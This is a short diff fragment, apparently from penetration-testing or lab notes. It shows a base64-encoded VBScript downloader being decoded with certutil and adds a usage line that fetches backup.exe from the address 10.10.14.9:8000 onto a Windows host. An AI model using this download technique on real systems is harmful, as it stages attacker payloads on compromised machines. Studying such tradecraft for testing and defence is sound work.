@@ -7,3 +7,5 @@ echo c3RyVXJsID0gV1NjcmlwdC5Bcmd1bWVudHMuSXRlbSgwKQpTdHJGaWxlID0gV1NjcmlwdC5Bcmd
 Then run:
 
 certutil -decode wget.vbs.b64 wget.vbs
+
+USAGE: cscript wget.vbs http://10.10.14.9:8000/backup.exe backup.exe
